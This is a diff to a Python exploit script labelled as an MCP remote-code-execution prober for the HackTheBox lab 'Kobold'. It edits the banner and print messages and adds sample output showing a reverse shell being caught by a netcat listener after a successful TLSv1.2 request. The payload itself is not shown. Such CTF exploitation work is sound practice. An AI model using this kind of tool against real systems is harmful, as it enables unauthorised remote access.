@@ -17,7 +17,7 @@ BANNER = """
 ████╗ ████║██╔══██╗██║   ██║██╔════╝██╔══██╗██║██╔════╝██║ ██╔╝
 ██╔████╔██║███████║██║   ██║█████╗  ██████╔╝██║██║     █████╔╝ 
 ██║╚██╔╝██║██╔══██║╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██║     ██╔═██╗ 
-██║ ╚═╝ ██║██║  ██║ ╚████╔╝ ███████╗██║  ██║██║╚██████╗██║  ██╗
+██║ ╚═╝ ██║██║  ██║ ╚████╔╝ ███████╗██║  ██║╚██████╗██║  ██╗
 ╚═╝     ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝
               HTB Kobold - MCP RCE TLS Version Prober
 """
@@ -87,9 +87,9 @@ def main():
 
             if status and status < 500:
                 print(f"  [+] {label} -> SUCCESS! (HTTP {status})")
-                print(f"  [+] Check your netcat listener - shell incoming!")
+                print(f"  [+] Check your netcat listener -- shell incoming!")
                 print(f"  [+] Server response: {body[:200]}")
-                print("\n[V] MAVERICK done. Happy hacking!\n")
+                print("\n[*] MAVERICK done. Happy hacking!\n")
                 sys.exit(0)
             else:
                 print(f"  [-] {label} -> Got HTTP {status}, not a clean hit.")
@@ -121,3 +121,14 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+# Sample output:
+# [1/4] Trying TLSv1.3...
+#   [-] TLSv1.3 -> SSL error: ...
+#   [~] TLSv1.3 not working, moving to TLSv1.2...
+#
+# [2/4] Trying TLSv1.2...
+#   [+] TLSv1.2 -> SUCCESS! (HTTP 200)
+#   [+] Check your netcat listener -- shell incoming!
+#
+# [*] MAVERICK done. Happy hacking!
